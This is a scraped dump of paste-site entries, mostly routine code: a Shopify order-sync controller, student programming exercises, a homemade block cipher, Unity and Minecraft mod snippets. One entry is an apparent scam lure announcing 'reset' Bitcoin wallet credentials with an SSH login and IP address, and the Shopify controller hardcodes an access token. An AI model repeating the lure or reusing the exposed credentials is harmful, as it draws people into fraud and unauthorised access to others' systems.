Regards,
GM-545083"
WzmYpeK6,BTC Wallet Credentials have been reset,castlclass_20,GetText,Friday 24th of November 2023 05:32:41 AM CDT,"Dear User
We have received a request to reset the login information for your Bitcoin wallet. If you did not make this request, please disregard this message.
Your new login credentials will be 
spoznajniq8:K8tX4P on 212.224.93.130
You can connect via SSH.
Regards"
hQAs0CKa,ShopifyController,nikhildas,C#,Friday 24th of November 2023 05:31:53 AM CDT,"using ApiProject2.Data;
using ApiProject2.Models;
using Azure.Core;
using Microsoft.AspNetCore.Mvc;
using ShopifySharp;
using ShopifySharp.GraphQL;
using ShopifySharp.Lists;
using System.Net.Http;
using Order = ShopifySharp.Order;

namespace ApiProject2.Controllers
{
    [Route(""api/[controller]"")]
    [ApiController]
    public class ShopifyController : ControllerBase
    {
        AppDataContext _appDataContext;
        private readonly HttpClient _httpClient;
        private readonly IConfiguration _config;
        public ShopifyController(IConfiguration config)
        {
            _config = config;
            _appDataContext = new AppDataContext(config);
            _httpClient = new HttpClient();
        }

        [HttpGet(""GetProducts"")]
        public async Task<IActionResult> GetProducts()
        {
            try
            {
                _httpClient.BaseAddress = new Uri(""https://club-builder-testing.myshopify.com/admin/api/2023-10/shop.json"");
                _httpClient.DefaultRequestHeaders.Add(""X-Shopify-Access-Token"", ""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"");
                HttpResponseMessage response = await _httpClient.GetAsync("""");

                // Check if the request was successful (status code 200-299)
                if (response.IsSuccessStatusCode)
                {
                    // Read the content of the response
                    string responseBody = await response.Content.ReadAsStringAsync();
                    return Ok(responseBody);
                }
                else
                {
                    return Ok(""Some error"");
                }

            }
            catch(Exception e)
            {
                return StatusCode(500, $""An error occurred: {e.Message}"");
            }
        }

        [HttpGet(""FetchOrders"")]
        public async Task<IActionResult> FetchOrders()
        {
            try
            {
                var myShopifyUrl = _config[""Shopify:ShopifyUrl""];
                var shopAccessToken = _config[""Shopify:ShopifyApiKey""];
                var service = new OrderService(myShopifyUrl, shopAccessToken);
                //IEnumerable<Order> orders = await service.ListAsync();
                ListResult<Order> orderListResult = await service.ListAsync();
                IEnumerable<Order> orders = orderListResult.Items;

                int entriesInserted = 0;
                foreach (Order order in orders)
                {
                    long orderId = order.Id != null ? (long)order.Id : 0;
                    bool entryExists = _appDataContext.ShopifyOrders.Any(o => o.OrderId == orderId);
                    if (!entryExists)
                    {
                        //Console.WriteLine(order.BillingAddress.Id);
                        ShopifyCAddress billingAddress = new()
                        {
                            Address1 = order.BillingAddress?.Address1 ?? """",
                            Address2 = order.BillingAddress?.Address2 ?? """",
                            City = order.BillingAddress?.City ?? """",
                            Company = order.BillingAddress?.Company ?? """",
                            Country = order.BillingAddress?.Country ?? """",
                            CountryCode = order.BillingAddress?.CountryCode ?? """",
                            CountryName = order.BillingAddress?.CountryName ?? """",
                            Default = order.BillingAddress?.Default?? false,
                            FirstName = order.BillingAddress?.FirstName ?? """",
                            LastName = order.BillingAddress?.LastName ?? """",
                            Latitude = order.BillingAddress?.Latitude?? 0,
                            Longitude = order.BillingAddress?.Longitude?? 0,
                            Name = order.BillingAddress?.Name ?? """",
                            Phone = order.BillingAddress?.Phone ?? """",
                            Province = order.BillingAddress?.Province ?? """",
                            ProvinceCode = order.BillingAddress?.ProvinceCode ?? """",
                            Zip = order.BillingAddress?.Zip ?? """",
                            AddressId = order.BillingAddress?.Id ?? 0,
                            AdminGraphQLAPIId = order.BillingAddress?.AdminGraphQLAPIId ?? """",
                        };
                        _appDataContext.ShopifyCAddresses.Add(billingAddress);
                        await _appDataContext.SaveChangesAsync();
                        
                        ShopifyOrder shopifyOrder = new()
                        {
                            AppId = order.AppId != null ? (int)order.AppId : 0,
                            OrderId = order.Id != null ? (long)order.Id : 0,
                            BillingAddressId = Convert.ToInt64(billingAddress.Id),
                            BrowserIp = order.BrowserIp,
                            BuyerAcceptsMarketing = order.BuyerAcceptsMarketing != null && (bool)order.BuyerAcceptsMarketing,
                            CancelReason = order.CancelReason ?? """",
                            CancelledAt = DateTime.Now,
                            CartToken = """",
                            CheckoutToken = """",
                            CheckoutId = 0,
                            ClientDetailsId = 0,
                            CreatedAt = DateTime.Now,
                            Confirmed = false,
                            Currency = """",
                            CustomerId = 0,
                            CustomerLocale = """",
                            DeviceId = """"
                        };

                        _appDataContext.ShopifyOrders.Add(shopifyOrder);
                        await _appDataContext.SaveChangesAsync();
                        entriesInserted += 1;
                    }
                }
                //return Ok(entriesInserted+ "" entries inserted"");
                return Ok(orderListResult);
            }
            catch (Exception e)
            {
                if (e.InnerException != null)
                {
                    return StatusCode(500, $""An error occurred: {e.InnerException.Message} - {e.StackTrace}"");
                }
                return StatusCode(500, $""An error occurred: {e.Message} - {e.StackTrace}"");
            }
        }
        [HttpPost(""CartCreation"")]
        public async Task<IActionResult> CartCreation(string topic)
        {
            var headers = Request.Headers;
            var data = Request.Body;
            Console.WriteLine(""y"");
            Console.WriteLine(headers);
            Console.WriteLine(data);
            Console.WriteLine(topic);
            return Ok();
        }
    }
}
"
WzW0RyF7,04. Bus,Spocoman,C++,Friday 24th of November 2023 05:09:35 AM CDT,"#include <iostream>
#include <string>

using namespace std;

int main() {
    int busCount;
    cin >> busCount;

    string bus, train;

    string* busTimes = new string[busCount];

    for (int i = 0; i < busCount; i++) {
        cin >> busTimes[i];
    }

    cin >> train;

    int index = 0,
        diffTime = 0,
        minDiff = 2147483647,
        trainTime = stoi(train.substr(0, 2)) * 60 + stoi(train.substr(2));

    for (int i = 0; i < busCount; i++) {
        diffTime = trainTime - (stoi(busTimes[i].substr(0, 2)) * 60 + stoi(busTimes[i].substr(2)));
        if (diffTime < 0) {
            index = i;
            break;
        }
        else if (abs(diffTime) < minDiff) {
            minDiff = abs(diffTime);
            index = i + 1;
        }
    }

    cout << index << endl;
    return 0;
}"
1sAiCkME,Harvest,MladenKarachanov,Java,Friday 24th of November 2023 04:47:26 AM CDT,"package ProgrammingBasics2;

import java.util.Scanner;


import java.util.Scanner;

    public class Harvest2 {
        public static void main(String[] args) {
            Scanner scanner = new Scanner(System.in);
            int x = Integer.parseInt(scanner.nextLine());
            double y = Double.parseDouble(scanner.nextLine());
            int z = Integer.parseInt(scanner.nextLine());
            int numWorkers = Integer.parseInt(scanner.nextLine());
            double allGrapes = y * x;
            double harvest = 0.40;
            // double oneMeters=y*0.40;
            double oneLiterForGrapes = 2.5;
            double wine =Math.ceil((allGrapes * harvest) / oneLiterForGrapes);
            double sum =Math.abs(wine-z);
            double liters =Math.ceil(sum / numWorkers);
            if (wine < z) {
                //System.out.println(sum);
                System.out.printf(""It will be a tough winter! More %.0f liters wine needed."",sum);
            }else{
                System.out.printf(""Good harvest this year! Total wine: %.0f liters."",wine);
                System.out.println();
                System.out.printf(""%.0f liters left -> %.0f liters per person."",sum,liters);
            }
        }
}
"
3UpPwZmb,Untitled,costi0n,PowerShell,Friday 24th of November 2023 04:40:00 AM CDT,"$WshShell = New-Object -comObject WScript.Shell
$Shortcut = $WshShell.CreateShortcut(""$Home\Desktop\AAAAAAAAA.lnk"")
$Shortcut.TargetPath = ""C:\WINDOWS\system32\notepad.exe""
$Shortcut.Save()

$bytes = [System.IO.File]::ReadAllBytes(""$Home\Desktop\AAAAAAAAA.lnk"")
$bytes[0x15] = $bytes[0x15] -bor 0x20 #set byte 21 (0x15) bit 6 (0x20) ON
[System.IO.File]::WriteAllBytes(""$Home\Desktop\AAAAAAAAA.lnk"", $bytes)"
c79TnwKr,File Handling,akzer,C,Friday 24th of November 2023 04:38:35 AM CDT,"#include <stdio.h>
#include <string.h>

int main()
{
    FILE *f;
    char name[50];
    f = fopen(""result.txt"", ""w"");
    printf(""What is your name? (enter in lowercase peeliz) "");
    scanf(""%s"", name);
    int eq = strcmp(""aman"", name);
    if (eq == 0)
        fputs(""Marvelous"", f);
    else
        fputs(""You are very good boy!"", f);
    fclose(f);
    return 0;
}"
Hi6WZE4y,SceneAttribute,gameDevTeacher,C#,Friday 24th of November 2023 04:37:24 AM CDT,"using UnityEngine;

public class SceneAttribute : PropertyAttribute
{

}"
vr8HMQmh,SceneDrawer,gameDevTeacher,C#,Friday 24th of November 2023 04:36:53 AM CDT,"using UnityEditor;
using UnityEngine;

[CustomPropertyDrawer(typeof(SceneAttribute))]
public class SceneDrawer : PropertyDrawer
{

    public override void OnGUI(Rect position, SerializedProperty property, GUIContent label)
    {

        if (property.propertyType == SerializedPropertyType.String)
        {
            var sceneObject = GetSceneObject(property.stringValue);
            var scene = EditorGUI.ObjectField(position, label, sceneObject, typeof(SceneAsset), true);
            if (scene == null)
            {
                property.stringValue = """";
            }
            else if (scene.name != property.stringValue)
            {
                var sceneObj = GetSceneObject(scene.name);
                if (sceneObj == null)
                {
                    Debug.LogWarning(""The scene "" + scene.name + "" cannot be used. To use this scene add it to the build settings for the project"");
                }
                else
                {
                    property.stringValue = scene.name;
                }
            }
        }
        else
            EditorGUI.LabelField(position, label.text, ""Use [Scene] with strings."");
    }
    protected SceneAsset GetSceneObject(string sceneObjectName)
    {
        if (string.IsNullOrEmpty(sceneObjectName))
        {
            return null;
        }

        foreach (var editorScene in EditorBuildSettings.scenes)
        {
            if (editorScene.path.IndexOf(sceneObjectName) != -1)
            {
                return AssetDatabase.LoadAssetAtPath(editorScene.path, typeof(SceneAsset)) as SceneAsset;
            }
        }
        Debug.LogWarning(""Scene ["" + sceneObjectName + ""] cannot be used. Add this scene to the 'Scenes in the Build' in build settings."");
        return null;
    }
}"
dEp5KEG0,Untitled,DBDEBICH,C++,Friday 24th of November 2023 04:21:50 AM CDT,"#include ""tools.h""


int Table_C[9][4] = {
    {0xAC25, 0x8A93, 0x243D, 0x262E},
    {0xF887, 0xC4F2, 0x8E36, 0x9FA1},
    {0x7DC0, 0x6A29, 0x6D84, 0x34BD},
    {0xA267, 0xCC15, 0x04FE, 0xB94A},
    {0xDF24, 0x40EF, 0x96DA, 0x905F},
    {0xD631, 0xAA62, 0x4D15, 0x70CB},
    {0x7533, 0x45FC, 0x5337, 0xD25E},
    {0xA926, 0x1C7B, 0x5F12, 0x4ECC},
    {0x3C86, 0x28DB, 0xFC01, 0x7CB1}
};

int Table_S[9][4] = {
    { 4,  7, 11,  8},
    { 7, 14,  5,  4},
    { 8,  2,  9,  4},
    {13,  1, 14,  6},
    { 7, 12,  5,  1},
    { 2,  4, 12,  3},
    { 9,  2, 11, 13},
    {12,  3,  6, 11},
    { 7, 15,  4, 14}
};

char Table_logic[9][4] = {
    {'&','|','&','|',},
    {'|','|','|','|',},
    {'&','|','|','&',},
    {'|','&','|','|',},
    {'|','|','&','&',},
    {'&','&','&','|',},
    {'&','|','|','|',},
    {'&','|','&','&',},
    {'|','|','&','|',}
};

std::bitset<16> Tools::r_shift (std::bitset<16> BITS, unsigned int STEP) {
    return (BITS >> STEP) | ((BITS << 16 - STEP));
}

bool Tools::fullAdder(bool b1, bool b2, bool& carry) 
{ 
    bool sum = (b1 ^ b2) ^ carry; 
    carry = (b1 && b2) || (b1 && carry) || (b2 && carry); 
    return sum; 
}

std::bitset<16> Tools::bitsetAdd(std::bitset<16>& x, std::bitset<16>& y) 
{ 
    bool carry = false; 
    std::bitset<16> ans; 
    for (int i = 0; i < 16; i++) { 
        ans[i] = fullAdder(x[i], y[i], carry); 
    } 
    return ans; 
}

std::vector<std::bitset<16> > Tools::keygen(std::bitset<128> key128) {
    std::bitset<16> k0, k1, k2, k3, k4, k5, k6, k7;
    std::vector<std::bitset<16> > result;
    for (int i = 127; i >= 0; i--) {
        if (i > 111) {
            k0 <<= 1;
            k0[0] = key128[i];
        }
        if (i > 95) {
            k1 <<= 1;
            k1[0] = key128[i];
        }
        if (i > 79) {
            k2 <<= 1;
            k2[0] = key128[i];
        }
        if (i > 63) {
            k3 <<= 1;
            k3[0] = key128[i];
        }
        if (i > 47) {
            k4 <<= 1;
            k4[0] = key128[i];
        }
        if (i > 31) {
            k5 <<= 1;
            k5[0] = key128[i];
        }
        if (i > 15) {
            k6 <<= 1;
            k6[0] = key128[i];
        }
        if (i >= 0) {
            k7 <<= 1;
            k7[0] = key128[i];
        }
    }
    result.push_back(k0);
    result.push_back(k1);
    result.push_back(k2);
    result.push_back(k3);
    result.push_back(k4);
    result.push_back(k5);
    result.push_back(k6);
    result.push_back(k7);

    return result;
}

std::vector<std::bitset<16> > Tools::subbgen(std::bitset<64> N) {
    std::bitset<16> a, b, c, d;
    std::vector<std::bitset<16> > result;
    for (int i = 63; i >= 0; i--) {
        if (i > 47) {
            a <<= 1;
            a[0] = N[i];
        }
        if (i > 31) {
            b <<= 1;
            b[0] = N[i];
        }
        if (i > 15) {
            c <<= 1;
            c[0] = N[i];
        }
        if (i >= 0) {
            d <<= 1;
            d[0] = N[i];
        }
    }
    result.push_back(a);
    result.push_back(b);
    result.push_back(c);
    result.push_back(d);
    
    return result;
}

std::vector<std::bitset<8> > Tools::resultcompiler(std::bitset<16> A, std::bitset<16>B, std::bitset<16>C, std::bitset<16>D) {
    std::vector<std::bitset<8> > bit_result;
    std::bitset<8> temp1, temp2;
    for (int j = 0; j < 16; j++) {
        if (j < 8) {
            temp1 << 1;
            temp1[j] = A[j];
        } else {
            temp2 << 1;
            temp2[j-8] = A[j];
        }
    } bit_result.push_back(temp1); bit_result.push_back(temp2);
    
    for (int j = 0; j < 16; j++) {
        if (j < 8) {
            temp1 << 1;
            temp1[j] = B[j];
        } else {
            temp2 << 1;
            temp2[j-8] = B[j];
        }
    } bit_result.push_back(temp1); bit_result.push_back(temp2);

    for (int j = 0; j < 16; j++) {
        if (j < 8) {
            temp1 << 1;
            temp1[j] = C[j];
        } else {
            temp2 << 1;
            temp2[j-8] = C[j];
        }
    } bit_result.push_back(temp1); bit_result.push_back(temp2);

    for (int j = 0; j < 16; j++) {
        if (j < 8) {
            temp1 << 1;
            temp1[j] = D[j];
        } else {
            temp2 << 1;
            temp2[j-8] = D[j];
        }
    } bit_result.push_back(temp1); bit_result.push_back(temp2);

    return bit_result;
}

std::vector<std::bitset<16> > Tools::iteration (std::bitset<16> X1, std::bitset<16> X2, std::bitset<16> X3, std::bitset<16> X4, std::bitset<16>key, int round, int iter) {
    std::vector<std::bitset<16> > Y_array;
    std::bitset<16> Y1, Y2, Y3, Y4;
    std::bitset<16> temp1 = X3 ^ key;
    int s = Table_S[round][iter];
    Y3 = r_shift(bitsetAdd(X2, temp1), s);
    std::bitset<16> temp2;
    if (Table_logic[round][iter] == '&') temp2 = Y3 & X4;
    else temp2 = Y3 | X4;
    Y1 = bitsetAdd(X1, temp2);
    Y2 = X2; Y4 = X4;
    
    Y_array.push_back(Y1);
    Y_array.push_back(Y2);
    Y_array.push_back(Y3);
    Y_array.push_back(Y4);

    return Y_array;
}"
RZg8PYJ2,Untitled,DBDEBICH,C++,Friday 24th of November 2023 04:21:16 AM CDT,"#ifndef TOOLS_H
#define TOOLS_H

#include <iostream>
#include <vector>
#include <bitset>


extern int Table_C[9][4];
extern int Table_S[9][4];
extern char Table_logic[9][4];

class Tools {
    private:
    public:
        /**
         * @brief Циклический сдвиг вправо на N бит
         * @param BYTE Входящий байт данных
         * @param STEP Число на которое нужно произвести сдвиг
         * @return Новый байт с произведённым свигом 
         */
        static std::bitset<16> r_shift (std::bitset<16> BITS, unsigned int STEP);

        static bool fullAdder(bool b1, bool b2, bool& carry);
        static std::bitset<16> bitsetAdd(std::bitset<16>& x, std::bitset<16>& y);

        /**
         * @brief Разбиение 128-битного ключа на K-фрагменты
         * @param key128 Входящий 128-битный ключ
         * @return Массив K-фрагментами 128-битного ключа
         */
        static std::vector<std::bitset<16> > keygen(std::bitset<128> key128);

        /**
         * @brief Разбиение 64-битного блока на 4 субблока по 16 бит
         * @param N Входящий 64-битный блок
         * @return Массив с 4 субблоками
         */
        static std::vector<std::bitset<16> > subbgen(std::bitset<64> N);

        static std::vector<std::bitset<8> > resultcompiler(std::bitset<16> A, std::bitset<16>B, std::bitset<16>C, std::bitset<16>D);

        /**
         * @brief Функция итерации
         * @param X1__X4 a b c d
         * @param key модифицированный ключ
         * @param round раунд
         * @param iter итерация
         * @return Массив с преобразованными субблоками
         */
        static std::vector<std::bitset<16> > iteration (std::bitset<16> X1, std::bitset<16> X2, std::bitset<16> X3, std::bitset<16> X4, std::bitset<16>key, int round, int iter);
};
#endif // TOOLS_H"
W3KvUMBM,Untitled,DBDEBICH,C++,Friday 24th of November 2023 04:19:54 AM CDT,"#include <iostream>
#include <cstdlib>
#include <sstream>
#include ""tools.h""

class Processor {
    private:
    public:
        std::string encode(std::string msg, std::string key);
};

std::string Processor::encode(std::string msg, std::string key) {
    std::bitset<64> N;
    for (int i = 0; i < 8; i++) {
        N <<= 8;
        N |= msg[i];
    }

    std::vector<std::bitset<16> > sub_blocks = Tools::subbgen(N);
    
    std::bitset<128> key128;
    for (int i = 0; i < 16; i++) {
        key128 <<= 8;
        key128 |= key[i];
    }

    std::vector<std::bitset<16> > K_array = Tools::keygen(key128);
    std::bitset<16> KS0, KS1, KS2, KS3, KF0, KF1, KF2, KF3;
    KS0 = K_array[4]; KS1 = K_array[5]; KS2 = K_array[6]; KS3 = K_array[7];
    KF0 = K_array[3]; KF1 = K_array[2]; KF2 = K_array[1]; KF3 = K_array[0];

    std::bitset<16> A,B,C,D;
    A = (sub_blocks[0] ^ KS0);
    B = (sub_blocks[1] ^ KS1);
    C = (sub_blocks[2] ^ KS2);
    D = (sub_blocks[3] ^ KS3);

    // 9 Раундов по 4 итерации каждый
    for (int i = 0; i < 9; i++) {
        for (int k = 0; k < 4; k++){
            std::bitset<16> KR = K_array[i];
            std::bitset<16> c = Table_C[i][k];
            std::bitset<16> KRC = Tools::bitsetAdd(KR, c);
            std::vector<std::bitset<16> > Y;
            switch (k) {
                case 0:
                    Y = Tools::iteration(A,B,C,D,KRC,i,k);
                    A = Y[0]; B = Y[1]; C = Y[2]; D = Y[3];
                    break;
                case 1:
                    Y = Tools::iteration(B,C,D,A,KRC,i,k);
                    A = Y[0]; B = Y[1]; C = Y[2]; D = Y[3];
                    break;
                case 2:
                    Y = Tools::iteration(C,D,A,B,KRC,i,k);
                    A = Y[0]; B = Y[1]; C = Y[2]; D = Y[3];
                    break;
                case 3:
                    Y = Tools::iteration(D,A,B,C,KRC,i,k);
                    A = Y[0]; B = Y[1]; C = Y[2]; D = Y[3];
                    break;
            }
        }
    }

    A ^= KF0; B ^= KF1; C ^= KF2; D ^= KF3;

    std::vector<std::bitset<8> > bit_result = Tools::resultcompiler(A,B,C,D);

    std::string total_result = """";

    for (int i = 0; i < bit_result.size(); i++) {
        std::stringstream ss;
        ss << std::hex << bit_result[i].to_ulong();
        total_result += ss.str() + "" "";
    }

    return total_result;
}


int main(int argc, char const *argv[]) {
    Processor NUSH;
    std::string msg, key, result;
    msg = ""valorant"";
    key = ""superdupersecret"";
    result = NUSH.encode(msg, key);
    std::cout << result << std::endl;
    return 0;
}"
vqyTLGzp,Untitled,Skos_Martren,C++,Friday 24th of November 2023 03:58:10 AM CDT,"#include <iostream>
#include <vector>
#include <string>

class SimpleClass
{
  
  public: 
  inline SimpleClass(const std::basic_string<char> & str, int value)
  : myVector{std::vector<int, std::allocator<int> >()}
  , myString{std::basic_string<char>(str)}
  , myInt{value}
  {
    this->myVector.push_back(value);
  }
  
  inline void printData() const
  {
    std::operator<<(std::operator<<(std::operator<<(std::cout, ""String: ""), this->myString), ""\n"");
    std::operator<<(std::operator<<(std::cout, ""Int: "").operator<<(this->myInt), ""\n"");
    std::operator<<(std::cout, ""Vector: "");
    {
      const std::vector<int, std::allocator<int> > & __range1 = this->myVector;
      __gnu_cxx::__normal_iterator<const int *, std::vector<int, std::allocator<int> > > __begin1 = __range1.begin();
      __gnu_cxx::__normal_iterator<const int *, std::vector<int, std::allocator<int> > > __end1 = __range1.end();
      for(; __gnu_cxx::operator!=(__begin1, __end1); __begin1.operator++()) {
        int element = __begin1.operator*();
        std::operator<<(std::cout.operator<<(element), "" "");
      }
      
    }
    std::operator<<(std::cout, ""\n"");
  }
  
  
  private: 
  std::vector<int, std::allocator<int> > myVector;
  std::basic_string<char> myString;
  int myInt;
  public: 
  // inline ~SimpleClass() noexcept = default;
};



int main()
{
  SimpleClass myObject = SimpleClass(std::basic_string<char>(""Hello, World!"", std::allocator<char>()), 42);
  myObject.printData();
  return 0;
}
"
uVpjqwLy,Untitled,Skos_Martren,C++,Friday 24th of November 2023 03:57:03 AM CDT,"#include <iostream>
#include <vector>
#include <string>

class SimpleClass {
public:
    // Конструктор с инициализацией полей
    SimpleClass(const std::string& str, int value) : myString(str), myInt(value) {
        // Пример добавления элементов в вектор в конструкторе
        myVector.push_back(value);
    }

    // Пример метода, который выводит содержимое полей
    void printData() const {
        std::cout << ""String: "" << myString << ""\n"";
        std::cout << ""Int: "" << myInt << ""\n"";
        std::cout << ""Vector: "";
        for (int element : myVector) {
            std::cout << element << "" "";
        }
        std::cout << ""\n"";
    }

private:
    // Пример поля класса - вектор, строка и целый тип
    std::vector<int> myVector;
    std::string myString;
    int myInt;
};

int main() {
    // Использование класса
    SimpleClass myObject(""Hello, World!"", 42);
    myObject.printData();

    return 0;
}"
WVwghs5E,бмо графы0.1,vatman,Python,Friday 24th of November 2023 03:46:04 AM CDT,"import numpy as np
import matplotlib.pyplot as plt
from mpl_toolkits.mplot3d import Axes3D
import networkx as nx
from scipy.spatial import distance
from scipy.spatial import distance_matrix
import itertools
vertex_k = 0.5 # Замените на ваше значение для коэффициента аппроксимации вершин
edge_k =0.5  # Замените на ваше значение для коэффициента растяжения ребер
wedge_k = 10 # Замените на ваше значение для коэффициента изгиба клиньев
np.random.seed(8)  
vectors = [np.random.randint(-6, 7, 3) for _ in range(100)]
 
# Выбираем три случайные точки (вектора)
indices = np.random.choice(len(vectors),5, replace=False)
selected_vectors = [vectors[i] for i in indices]
print(indices) 
# Вычисляем матрицу расстояний между всеми векторами
distances = distance_matrix(selected_vectors, selected_vectors)

# Заменяем диагональные элементы на бесконечность
np.fill_diagonal(distances, np.inf)

# Создаем граф
G = nx.Graph()

#Добавляем вершины в граф
for i in range(len(selected_vectors)):
    G.add_node(i)

# Выводим координаты всех вершин графа
for node in G.nodes:
    print(f""Вершина {node+1}: {selected_vectors[node]}"")
    
# Добавляем ребра в граф, соединяя каждую вершину с ее ближайшей вершиной
for i in range(len(selected_vectors)-1):
    # Находим ближайшую вершину к текущей вершине
    nearest_vertex = np.argmin(distances[i])
    print(i,nearest_vertex) 
    # Добавляем ребро между текущей вершиной и ее ближайшей вершиной
    G.add_edge(i, nearest_vertex)   

    
# Расчет энергии вершины
def calculate_vertex_energy(vertex, vectors, k):
    energy = 0
    for vector in vectors:
        energy += np.linalg.norm(vertex - vector)**2
    return k * energy
 
# Расчет энергии ребра
def calculate_edge_energy(edge, vectors, k):
    v1, v2 = vectors[edge[0]], vectors[edge[1]]
    return k * np.linalg.norm(v1 - v2)**2
 
# Расчет энергии клина
def calculate_wedge_energy(wedge, vectors, k):
    v1, v2, v3 = vectors[wedge[0]], vectors[wedge[1]], vectors[wedge[2]]
    return k * np.linalg.norm(v1 + v3 - 2*v2)**2
 
# Расчет энергии графа
def calculate_energy(graph, vectors):
    #vertex_k = 0.5 # Замените на ваше значение для коэффициента аппроксимации вершин
    #edge_k = 0.5 # Замените на ваше значение для коэффициента растяжения ребер
    #wedge_k = 0.5 # Замените на ваше значение для коэффициента изгиба клиньев
    
    energy = 0
    for node in graph.nodes:
        energy += calculate_vertex_energy(vectors[int(node)], vectors, vertex_k)
    for edge in graph.edges:
        energy += calculate_edge_energy(edge, vectors, edge_k)
        
    # Добавляем энергию клина для всех подграфов из трех вершин
    for nodes in itertools.combinations(graph.nodes, 3):
        if graph.has_edge(nodes[0], nodes[1]) and graph.has_edge(nodes[0], nodes[2]) and not graph.has_edge(nodes[1], nodes[2]):
            p1 = calculate_wedge_energy(nodes, vectors, wedge_k)
            print(""Энергия клина:"")
            print(p1)
            energy += p1
        elif graph.has_edge(nodes[0], nodes[1]) and not graph.has_edge(nodes[0], nodes[2]) and graph.has_edge(nodes[1], nodes[2]):
            p1 = calculate_wedge_energy(nodes, vectors, wedge_k)
            print(""Энергия клина:"")
            print(p1)
            energy += p1
        elif graph.has_edge(nodes[0], nodes[2]) and not graph.has_edge(nodes[0], nodes[1])  and graph.has_edge(nodes[1], nodes[2]):
            p1 = calculate_wedge_energy(nodes, vectors, wedge_k)
            print(""Энергия клина:"")
            print(p1)
            energy += p1    
            
        
    return energy
 
energy = calculate_energy(G, selected_vectors)
print(f'Энергия графа: {energy}')
   
    
# Визуализация проекции графа и векторов
fig = plt.figure()
ax = fig.add_subplot(111, projection='3d')
 
# Отображаем все векторы на графике
for vector in vectors:
    ax.scatter(vector[0], vector[1], vector[2], color='b')
 
# Отображаем выбранные векторы на графике
for vector in selected_vectors:
    ax.scatter(vector[0], vector[1], vector[2], color='r')
 
# Добавляем ребра между вершинами
for edge in G.edges:    
    ax.plot([selected_vectors[edge[0]][0], selected_vectors[edge[1]][0]],
            [selected_vectors[edge[0]][1], selected_vectors[edge[1]][1]],
            [selected_vectors[edge[0]][2], selected_vectors[edge[1]][2]], 'r-')
for edges in G.edges:
    print(edges) 
    
# Добавляем оси
ax.set_xlabel('X')
ax.set_ylabel('Y')
ax.set_zlabel('Z')
plt.show()"
ejJTZUaN,Oculus particle fix,dima_dencep,Java,Friday 24th of November 2023 03:12:17 AM CDT,"import com.google.common.collect.ImmutableSet;
import com.mojang.blaze3d.systems.RenderSystem;
import net.coderbot.iris.fantastic.ParticleRenderingPhase;
import net.coderbot.iris.fantastic.PhasedParticleEngine;
import net.coderbot.iris.pipeline.ShaderAccess;
import net.minecraft.client.particle.Particle;
import net.minecraft.client.particle.ParticleEngine;
import net.minecraft.client.particle.ParticleRenderType;
import net.minecraft.client.renderer.ShaderInstance;
import org.spongepowered.asm.mixin.Mixin;
import org.spongepowered.asm.mixin.Unique;
import org.spongepowered.asm.mixin.injection.At;
import org.spongepowered.asm.mixin.injection.Redirect;

import java.util.*;
import java.util.function.Supplier;

@Mixin(ParticleEngine.class)
public class ParticleEngineMixin implements PhasedParticleEngine {
    @Unique
    private ParticleRenderingPhase phase = ParticleRenderingPhase.EVERYTHING;
    private static final Set<ParticleRenderType> OPAQUE_PARTICLE_RENDER_TYPES;

    static {
        OPAQUE_PARTICLE_RENDER_TYPES = ImmutableSet.of(
                ParticleRenderType.PARTICLE_SHEET_OPAQUE,
                ParticleRenderType.PARTICLE_SHEET_LIT,
                ParticleRenderType.CUSTOM,
                ParticleRenderType.NO_RENDER
        );
    }

    @Redirect(
            method = ""render(Lcom/mojang/blaze3d/vertex/PoseStack;Lnet/minecraft/client/renderer/MultiBufferSource$BufferSource;Lnet/minecraft/client/renderer/LightTexture;Lnet/minecraft/client/Camera;FLnet/minecraft/client/renderer/culling/Frustum;)V"",
            at = @At(
                    value = ""INVOKE"",
                    target = ""Lcom/mojang/blaze3d/systems/RenderSystem;setShader(Ljava/util/function/Supplier;)V""
            ),
            remap = false
    )
    private void iris$changeParticleShader(Supplier<ShaderInstance> pSupplier0) {
        RenderSystem.setShader(this.phase == ParticleRenderingPhase.TRANSLUCENT ? ShaderAccess::getParticleTranslucentShader : pSupplier0);
    }

    @Redirect(
            method = ""render(Lcom/mojang/blaze3d/vertex/PoseStack;Lnet/minecraft/client/renderer/MultiBufferSource$BufferSource;Lnet/minecraft/client/renderer/LightTexture;Lnet/minecraft/client/Camera;FLnet/minecraft/client/renderer/culling/Frustum;)V"",
            at = @At(
                    value = ""INVOKE"",
                    target = ""Ljava/util/Map;keySet()Ljava/util/Set;""
            ),
            remap = false
    )
    private Set<ParticleRenderType> iris$selectParticlesToRender(Map<ParticleRenderType, Queue<Particle>> instance) {
        if (phase == ParticleRenderingPhase.TRANSLUCENT) {
            // Create a copy of the list
            //
            // We re-copy the list every time in case someone has added new particle texture sheets behind our back.
            Set<ParticleRenderType> toRender = new HashSet<>(instance.keySet());

            // Remove all known opaque particle texture sheets.
            OPAQUE_PARTICLE_RENDER_TYPES.forEach(toRender::remove);

            return toRender;
        } else if (phase == ParticleRenderingPhase.OPAQUE) {
            // Render only opaque particle sheets
            return OPAQUE_PARTICLE_RENDER_TYPES;
        } else {
            // Don't override particle rendering
            return instance.keySet();
        }
    }

    @Override
    public void setParticleRenderingPhase(ParticleRenderingPhase particleRenderingPhase) {
        this.phase = particleRenderingPhase;
    }
}"
77fy69iG,tooltips script,kerlser,JavaScript,Friday 24th of November 2023 03:04:45 AM CDT,"
// browser.chrome.toolbar_tips  true
// tooltips-Test3.uc.js

(function () {
    let sss = Components.classes[""@mozilla.org/content/style-sheet-service;1""].getService(Components.interfaces.nsIStyleSheetService);      
    let uri = Services.io.newURI(""data:text/css;charset=utf-8,"" + encodeURIComponent(`

        tooltip, 
        tooltip[label] {
                appearance: none !important;
                background-color: orange !important;
                border: 2px solid green !important;
                display: flex !important;
                visibility: visible !important;
                opacity: 1 !important;
                }

    `), null, null);
    sss.loadAndRegisterSheet(uri, sss.AGENT_SHEET);
})();

"
GHLdBVCU,printME,gabegt5000,Lua,Friday 24th of November 2023 02:24:44 AM CDT,"me = peripheral.wrap(""bottom"")
monitor= peripheral.wrap(""right"")

items={}
amount={}

function checkMe()
	melist = me.listItems()
	for a=1, #melist do
		itemName = melist[a].displayName
		Quantity = melist[a].amount
		table.insert(items,itemName)
		table.insert(amount,Quantity)
	end
end

function printShit()
	for a=1, #items do
		print(items[a], "","" , amount[a])
	end
end

checkMe()
printShit()"
V0s0zsVK,Scan QR to get enrollment number,MihirP007,Python,Friday 24th of November 2023 01:57:58 AM CDT,"import cv2
import numpy as np
from pyzbar.pyzbar import decode
from datetime import datetime,timedelta
active_people={}
last_student = 0
last_student_exit = 0
#img = cv2.imread('1.png')
